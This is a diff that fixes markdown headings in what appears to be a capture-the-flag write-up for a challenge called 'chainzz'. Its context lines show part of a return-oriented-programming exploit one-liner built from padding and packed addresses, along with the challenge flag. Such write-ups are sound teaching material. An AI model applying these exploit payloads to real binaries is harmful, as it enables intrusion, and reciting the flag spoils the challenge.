@@ -1,4 +1,4 @@
-#chainzz
+# chainzz
 
 To be able to solve this, you would need to read up on the writeup for r0pbaby
 
@@ -56,6 +56,6 @@ Final exploit: `run <<< $(python -c "print 'A'*28" + '\xe6\x85\x04\x08' + '\xfd\
 
 Things to note: Calling convention - `FUNCTION RET ARG`
 
-##flag
+## flag
 
 `HNF{2_ch4inzzzzzz}`
